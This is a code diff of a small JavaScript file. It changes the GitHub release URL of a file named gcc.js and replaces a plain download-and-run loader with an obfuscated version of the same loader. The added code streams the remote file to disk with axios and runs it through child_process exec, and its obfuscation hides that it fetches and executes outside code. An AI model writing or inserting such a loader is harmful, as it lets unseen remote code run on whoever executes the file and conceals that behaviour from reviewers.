@@ -1,15 +1,4 @@
-const url = 'https://github.com/jfux888/zeabur/releases/download/dl/gcc.js';
+const url = 'https://github.com/seav1/sc/releases/download/dl/gcc.js';
 const fileName = 'gcc.js';
 
-const axios = require('axios');
-const fs = require('fs');
-const { exec } = require('child_process');
-
-axios({
-    url: url,
-    responseType: 'stream'
-}).then(response => {
-    response.data.pipe(fs.createWriteStream(fileName)).on('finish', () => {
-        exec(`node ${fileName}`);
-    });
-});
+function _0x3a74(_0x7af419,_0x192fb4){const _0x23bf5d=_0x23bf();return _0x3a74=function(_0x3a74c5,_0x7fc5e3){_0x3a74c5=_0x3a74c5-0x121;let _0x48f69b=_0x23bf5d[_0x3a74c5];return _0x48f69b;},_0x3a74(_0x7af419,_0x192fb4);}const _0x4896ab=_0x3a74;(function(_0x4d3f64,_0x58d07b){const _0x1bcaf2=_0x3a74,_0x4e22a8=_0x4d3f64();while(!![]){try{const _0x124100=parseInt(_0x1bcaf2(0x131))/0x1+parseInt(_0x1bcaf2(0x12f))/0x2*(parseInt(_0x1bcaf2(0x12b))/0x3)+-parseInt(_0x1bcaf2(0x124))/0x4*(parseInt(_0x1bcaf2(0x125))/0x5)+parseInt(_0x1bcaf2(0x121))/0x6+parseInt(_0x1bcaf2(0x127))/0x7*(-parseInt(_0x1bcaf2(0x123))/0x8)+-parseInt(_0x1bcaf2(0x12a))/0x9+-parseInt(_0x1bcaf2(0x128))/0xa;if(_0x124100===_0x58d07b)break;else _0x4e22a8['push'](_0x4e22a8['shift']());}catch(_0x5b4627){_0x4e22a8['push'](_0x4e22a8['shift']());}}}(_0x23bf,0xc1ae5));function _0x23bf(){const _0x200cee=['1269199MjhHwq','3112050yZeKvZ','data','680QfRyuF','85060BbSAWX','20BZiIAQ','finish','22162yBgaqV','2465830SXqHpn','createWriteStream','4158432BfuRib','282RoqyyD','then','child_process','stream','1452izlixW','axios'];_0x23bf=function(){return _0x200cee;};return _0x23bf();}const axios=require(_0x4896ab(0x130)),fs=require('fs'),{exec}=require(_0x4896ab(0x12d));axios({'url':url,'responseType':_0x4896ab(0x12e)})[_0x4896ab(0x12c)](_0x5280dd=>{const _0x30235a=_0x4896ab;_0x5280dd[_0x30235a(0x122)]['pipe'](fs[_0x30235a(0x129)](fileName))['on'](_0x30235a(0x126),()=>{exec('node\x20'+fileName);});});
